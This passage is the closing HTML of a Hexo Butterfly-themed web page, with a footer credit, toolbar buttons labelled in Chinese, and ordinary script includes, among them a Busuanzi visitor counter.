target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>